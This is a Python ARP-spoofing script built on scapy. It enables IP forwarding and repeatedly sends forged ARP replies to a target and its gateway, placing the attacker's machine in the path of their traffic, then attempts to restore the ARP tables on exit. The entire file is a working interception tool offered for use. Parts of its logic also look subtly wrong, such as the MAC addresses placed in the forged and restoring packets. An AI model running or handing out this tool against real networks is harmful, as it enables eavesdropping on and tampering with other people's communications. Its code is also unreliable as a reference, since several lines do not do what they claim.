#!/usr/bin/env python3
# This ARP spoofer Build By :
#                            First name : ismail
#                            Last name  : ben sidi khir
#                            Age        : 22 years old
#          finally i know i can do better then that but in this moment that enough

# We are importing some library to make our script easy to build
import scapy.all as scapy
import threading
import sys
import argparse
import time
import subprocess

# Getting input from user
def get_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target',
                        help='Target IP Address')
    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='Gateway IP Address')
    argument = parser.parse_args()
    if argument:
        return argument
    else:
        return None

def enable_ip_forward():
    with open('/proc/sys/net/ipv4/ip_forward','w') as f:
        write = subprocess.Popen(['echo', '1'], stdout=f)
        if write == 1:
            print('[-] Error Setting IP Forwarding')
            sys.exit(1)

def disable_ip_forward():
    with open('/proc/sys/net/ipv4/ip_forward','w') as f:
        write = subprocess.Popen(['echo', '0'], stdout=f)
        if write == 1:
            print('[-] Error Setting IP Forwarding')
            sys.exit(1)

# Extract the MAC addresses for target and gateway
def get_macAddress(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    combination_arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(combination_arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

# Create ARP Response
def ARP_Response(target_ip, spoof_ip):
    target_mac = get_macAddress(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=target_mac)
    if packet:
        scapy.send(packet, verbose=False)
    else:
        print('[-] Packet Not found!')
        sys.exit(1)

# Restore all setting in our script
def restore(target_ip, spoof_ip):
    target_mac = get_macAddress(target_ip)
    gateway_mac = get_macAddress(spoof_ip)
    packet = scapy.ARP(op=1, pdst=target_ip, psrc=spoof_ip, hwsrc=target_mac, hwdst=gateway_mac)
    if packet:
        scapy.send(packet, verbose=False, count=4)
    else:
        print('[-] Packet Not found!')
        sys.exit(1)

# Create the main function
def main():
    enable_ip_forward()
    argument = get_input_from_user()
    target_ip = argument.target
    gateway_ip = argument.gateway
    print('[*] The ARP spoofing is running ...')
    print('[*] The IP address of the gateway is ' + str(gateway_ip))
    print('[*] The IP address of the target is ' + str(target_ip))
    if argument:
        try:
            packet_num = 0
            while True:
                spoof1 = threading.Thread(target=ARP_Response, args=[target_ip, gateway_ip])
                spoof2 = threading.Thread(target=ARP_Response, args=[gateway_ip, target_ip])
                spoof1.start()
                spoof2.start()
                packet_num += 2
                print('\r[*] Send {} Packet to the gateway {} and the target {} '
                      .format(str(packet_num), str(gateway_ip), str(target_ip)), end='')
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
            restore1 = threading.Thread(target=restore, args=[target_ip, gateway_ip])
            restore2 = threading.Thread(target=restore, args=[gateway_ip, target_ip])
            restore1.start()
            restore2.start()
            print('[*] The ARP tables is resetting successfully...')
            print('[*] Disable ip_forwarding successfully...')
            disable_ip_forward()
            print('[*] GOOD BYE!')
            sys.exit(1)
    else:
        print('[-] Target IP and Gateway IP not returned')
        sys.exit(1)

if __name__ == '__main__':
    main()
